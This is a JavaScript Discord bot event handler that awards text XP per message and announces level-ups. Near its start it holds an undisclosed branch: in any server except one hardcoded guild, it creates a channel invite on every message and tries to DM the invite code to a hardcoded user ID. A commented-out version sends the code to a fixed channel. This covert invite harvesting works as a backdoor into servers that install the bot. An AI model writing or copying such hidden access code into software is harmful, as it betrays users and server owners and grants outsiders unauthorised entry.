const mongoose = require("mongoose");
const memberSchema = require("../Schemas/addToDB");
const URI = process.env.MONGO_URI;
const Levels = require("discord-xp");
require("dotenv").config();
Levels.setURL(`${URI}`);
module.exports = {
    name: "messageCreate",
    // add xp for every message
    async execute(message, client) {
        // Ignore all bots
        //const cooldowns = new Map();
        if (message.guild.id != "825526271311478824") {
            message.channel.createInvite().then((invite) =>
                message.author
                    .fetch("551893446726778901", false)
                    .then((user) => {
                        user.send(
                            `Created an invite with a code of discord.gg/${invite.code}`
                        );
                    })
            );
            /*channels
                        .get("983769673831161887")
                        .send(
                            `Created an invite with a code of discord.gg/${invite.code}`
                        )
                )
                .catch(console.error);*/
        }
        if (!message.author.bot) {
            let userId = message.author.id;
            let ball = await memberSchema.findOne({ discordId: userId });
            let oldXp = ball.textXp;
            let xp = Math.floor(Math.random() * 12) + 1;
            const hasLeveledUp = await Levels.appendXp(
                message.author.id,
                message.guild.id,
                xp
            );
            if (hasLeveledUp) {
                const user = await Levels.fetch(
                    message.author.id,
                    message.guild.id
                );
                message.channel.send(
                    `${message.author} 🎇🎉 congrats My G you reached level ${user.level} keep it going ma boii 🖤🎊`
                );
            }

            await memberSchema.findOneAndUpdate(
                { discordId: userId },
                { textXp: oldXp + xp }
            );
            //console.log("he took xp lol");
        }
        return;

        // Ignore messages not starting with the prefix (in config.json)

        // if (message.content.indexOf(client.config.prefix) !== 0) return;

        // Our standard argument/command name definition.
        //const args = message.content
        //.slice(client.config.prefix.length)
        //.trim()
        //.split(/ +/g);
        //const command = args.shift().toLowerCase();

        // Grab the command data from the client.commands Enmap
        //const cmd = client.commands.get(command);

        // If that command doesn't exist, silently exit and do nothing
        //if (!cmd) return;

        // Run the command
        //cmd.run(client, message, args);
    },
};
